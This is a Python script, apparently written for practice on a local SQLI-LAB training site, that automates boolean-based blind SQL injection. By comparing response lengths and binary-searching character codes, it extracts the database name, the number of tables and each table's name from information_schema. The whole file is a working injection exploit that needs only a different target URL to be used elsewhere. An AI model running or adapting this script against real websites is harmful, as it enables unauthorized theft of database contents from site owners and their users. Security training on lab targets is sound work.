import requests
import sys
MAX_DB_LEN=20
MAX_Table_Num=20
MAX_Table_len=20
success_url="http://localhost/SQLI-LAB/Less-/?id=1"
success_len=len(requests.get(success_url).text)

def get_DBName_len():
    DBName_len=0
    url_template=success_url+"' and (length(database())={0})%2D%2D%20"
    for i in range(1,MAX_DB_LEN):
        url=url_template.format(i)
        if len(requests.get(url).text)==success_len:
            DBName_len=i
            print("DB_len is : ",DBName_len)
            break
    if DBName_len==0:
        if i==MAX_DB_LEN-1:
            print("DBName_len>MAX_DBName_len")
        print("[ERROR]")
        exit()
    return DBName_len
        
def get_DBName_name(DB_len):
    DBName=''
    url_template=success_url+"' and ascii(substr(database(),{0},1)) > {1} %2D%2D%20"   
    print("数据库名：",end='')
    sys.stdout.flush()
    for i in range(1,DB_len+1):
        low=48
        high=122
        url_b=url_template.format(i,122)
        if len(requests.get(url_b).text)==success_len:
                print("数据库字符不是常用字符")
                exit()
        while(low<high):
            mid=int((low+high)/2)
            url=url_template.format(i,mid)
            if len(requests.get(url).text)==success_len:
                low=mid+1
            else:
                 high=mid
        print(chr(low),end='')
        sys.stdout.flush()
    print()
def get_Table_number(DBName):
    Tablenumber=0
    url_template=success_url+"'\
        and(select count(table_name) as a from information_schema.tables\
            where table_schema=database() having a={0})%2d%2d%20"
    for i in range(1,MAX_Table_Num+1):
        url=url_template.format(i)
        if len(requests.get(url).text)==success_len:
            Tablenumber=i
            print("表的个数为：",Tablenumber)
            break
    if Tablenumber==0:
        if i==MAX_Table_Num:
            print("表的实际个数大于程序设定的最大个数")
    return Tablenumber

def get_Table_Len(TNumber):
    table_len=0
    url_template=success_url+"'and (select length(table_name) from information_schema.tables\
        where table_schema=database() limit {0},1)={1}%2D%2D%20"
    for i in range(1,MAX_Table_len+1):
        url=url_template.format(TNumber,i)
        if len(requests.get(url).text)==success_len:
            table_len=i
            break
    if table_len==0:
        if i==MAX_Table_len:
            print("表的长度的最大值设置的过于小了")
        print("读表的长度时，程序错误")
    return table_len
def get_Table_Name(Tnum,Tlen):
    table_name=''
    url_template=success_url+"'and ascii(substr((select table_name from information_schema.tables \
        where table_schema=database() limit {0},1),{1},1))>{2} %2d%2d%20"
    print("表名：",end='')
    sys.stdout.flush()
    for i in range(1,Tlen+1):
        low=1
        high=122
        url_b=url_template.format(Tnum,i,122)
        if len(requests.get(url_b).text)==success_len:
                print("表字符不是常用字符")
                exit()
        while(low<high):
            mid=int((low+high)/2)
            url=url_template.format(Tnum,i,mid)
            if len(requests.get(url).text)==success_len:
                low=mid+1
            else:
                 high=mid
        print(chr(low),end='')
        sys.stdout.flush()
dbname=get_DBName_name(get_DBName_len())
table_number=get_Table_number(dbname)
for i in range(0,table_number):
    table_len=get_Table_Len(i)
    table_name=get_Table_Name(i,table_len)

